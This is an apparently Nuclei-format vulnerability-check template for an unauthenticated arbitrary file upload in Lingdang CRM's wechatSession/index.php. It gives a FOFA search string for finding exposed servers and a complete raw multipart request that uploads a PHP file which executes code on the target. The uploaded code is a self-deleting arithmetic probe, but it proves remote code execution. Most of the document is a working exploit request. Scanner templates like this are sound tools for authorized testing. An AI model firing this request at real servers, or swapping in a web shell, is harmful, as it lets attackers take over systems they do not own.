id: lingdangCRM-wechatSession_index_php-File-upload

info:
  name: 灵当CRM wechatSession/index.php 任意文件上传
  author: Superhero
  severity: high
  description: |-
    fofa: body="include/js/ldAjax.js"
    灵当CRM wechatSession/index.php 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488773&idx=1&sn=93f2960899fa3bf8896cee4c09c2d692&chksm=c267a036f51029205b96cfeda911f8a7c625bf7b59ec93103d7f4f712a724889ce540b3d31d7&token=1619136955&lang=zh_CN#rd
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
        
        ------WebKitFormBoundary03rNBzFMIytvpWhy
        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
        Content-Type: image/jpeg
        
        <?php print(111*222);unlink(__FILE__);?>
        ------WebKitFormBoundary03rNBzFMIytvpWhy--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"code":1'
          - '{"upload_status":true'
          - '"filepath":'
        condition: and
      - type: status
        status: 
          - 200